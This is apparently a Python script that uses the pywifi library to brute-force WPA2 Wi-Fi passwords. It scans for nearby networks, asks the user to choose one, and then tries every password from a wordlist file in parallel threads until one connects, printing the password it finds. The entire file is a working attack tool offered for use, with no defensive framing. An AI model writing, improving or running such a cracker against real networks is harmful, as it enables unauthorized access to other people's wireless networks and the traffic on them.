import pywifi
from pywifi import const
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)  # Уменьшено время ожидания
    scan_results = iface.scan_results()
    networks = []

    for network in scan_results:
        networks.append(network.ssid)

    return networks

def test_password(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(5)  # Увеличено время ожидания для корректного отключения

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)
        time.sleep(10)  # Увеличено время ожидания для подключения

        if iface.status() == const.IFACE_CONNECTED:
            print(f'Success! Password for {ssid} is {password}')
            iface.disconnect()  # Отключение после успешного подключения
            return True
        else:
            print(f'Failed to connect to {ssid} with password: {password}')
            return False
    else:
        print(f'Interface status is not disconnected for network {ssid}')
        return False


def main():
    networks = scan_networks()

    if not networks:
        print("No networks found.")
        return

    print("Available networks:")
    for idx, network in enumerate(networks):
        print(f"{idx + 1}. {network}")

    choice = int(input("Select a network (enter the number): ")) - 1

    if 0 <= choice < len(networks):
        ssid = networks[choice]
        print(f'Selected network: {ssid}')

        with open('BrutforceWifi/WifiPassword.txt', 'r') as f:
            passwords = f.readlines()

        # Параллельная проверка паролей
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(test_password, ssid, password.strip()) for password in passwords]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print("Password found!")
                    break
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
